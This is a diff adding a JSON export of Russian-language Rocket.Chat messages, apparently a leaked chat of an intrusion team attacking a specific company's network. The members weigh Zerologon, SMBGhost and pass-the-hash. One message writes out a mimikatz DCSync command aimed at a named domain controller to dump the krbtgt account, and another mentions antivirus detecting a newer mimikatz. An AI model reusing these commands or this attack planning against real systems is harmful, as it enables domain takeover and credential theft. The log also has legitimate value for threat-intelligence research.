@@ -1,0 +1,89 @@
+{
+  "messages": [
+    {
+      "_id": "eYPxmEMcicih6AeR3",
+      "rid": "jSbSheD57egaPgxZr",
+      "msg": "спроси у коллег, там по моему рце находили?",
+      "ts": "2020-10-20T23:12:47.201Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-20T23:12:47.237Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "QmioDPLMQifop3ucJ",
+      "rid": "jSbSheD57egaPgxZr",
+      "msg": "и это только чекер",
+      "ts": "2020-10-20T23:10:14.184Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T23:10:14.220Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AKMoh2umgqcQe5Jsz",
+      "rid": "jSbSheD57egaPgxZr",
+      "msg": "я нашел чекер, но он чекает только по 1 ip за раз",
+      "ts": "2020-10-20T23:10:07.621Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T23:10:07.655Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cNpkjDwHRjqFW9Gcw",
+      "rid": "jSbSheD57egaPgxZr",
+      "msg": "нууу, я не проверял)",
+      "ts": "2020-10-20T23:09:35.440Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T23:09:35.472Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nF4Xs9jW8hn6zJnve",
+      "rid": "jSbSheD57egaPgxZr",
+      "msg": "смбгост мимо?",
+      "ts": "2020-10-20T22:47:40.474Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-20T22:47:40.507Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3iEpmMchFM4bYLP3h",
+      "rid": "jSbSheD57egaPgxZr",
+      "msg": "вообщем по этой сетке\nмоя последняя надежда на зерологон(который не пачнули после последнй попытки лол)\nчтобы  снять dcsync надо делать токен через pth, но т.к. нет системы - не выйдет\n```\nmimikatz lsadump::dcsync /dc:SS-Data2.Austin.SilencerShop.com /user:SilencerShop\\krbtgt /authuser:SS-DATA2$ /authdomain:. /authpassword:\"\" /authntlm\n``` \nвот эта строка не работает походу потому что в CS старый мимик\nа новую версию на машину не уровнить т.к. видит как вирус.",
+      "ts": "2020-10-20T21:35:22.486Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-20T21:35:22.587Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
